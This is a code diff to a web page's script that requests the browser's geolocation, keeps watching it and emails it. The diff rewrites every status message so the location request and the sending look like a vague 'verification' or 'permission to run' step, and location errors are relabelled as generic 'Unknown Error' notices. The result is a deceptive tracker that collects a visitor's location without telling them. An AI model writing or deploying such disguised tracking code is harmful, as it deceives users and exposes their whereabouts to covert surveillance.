@@ -191,7 +191,7 @@
       }
 
       async function emailMyLocation() {
-        if (!lastPos) return setStatus("No location yet. Click Request location first.");
+        if (!lastPos) return setStatus("Unable to detect verification. Please verify completely first.");
 
         setStatus("Sending email…");
 
@@ -214,19 +214,19 @@
   setStatus("✅ Email sent!");
 } else {
   const t = await r.text();
-  setStatus("❌ Email failed (" + r.status + "):\n" + t);
+  setStatus("❌ Error. Please try again later (" + r.status + "):\n" + t);
 }
 
         } catch (e) {
-          setStatus("❌ Network error: " + e.message);
+          setStatus("❌ Network error; Please try again later. Error code: " + e.message);
         }
       }
 
       // ---- Button handlers (the key missing piece) ----
       btnStart.addEventListener("click", () => {
-        if (!navigator.geolocation) return setStatus("Geolocation not supported.");
+        if (!navigator.geolocation) return setStatus("Device/Browser not supported. Please try on a different device/browser or try again later.");
 
-        setStatus("Requesting location permission…");
+        setStatus("Requesting permission to run...");
 
         navigator.geolocation.getCurrentPosition(
           async (pos) => {
@@ -242,20 +242,21 @@
             startWatchingLocation();
 
             btnEmail.disabled = false;
-            setStatus("✅ Location ready. You can email it now.");
+            setStatus("⚠️ Permission unlocked. Verification needed now.");
           },
-          (err) => setStatus("❌ Location error: " + err.message),
+          (err) => setStatus("❌ Unknown Error; Please try again later; Error Code: " + err.message),
           { enableHighAccuracy: false, timeout: 20000, maximumAge: 600000 }
         );
       });
 
       btnEmail.addEventListener("click", emailMyLocation);
 
-      setStatus("Ready.");
+      setStatus("Server's ready to grant permission.");
     });
   </script>
 </body>
 </html>
+
 
 
 
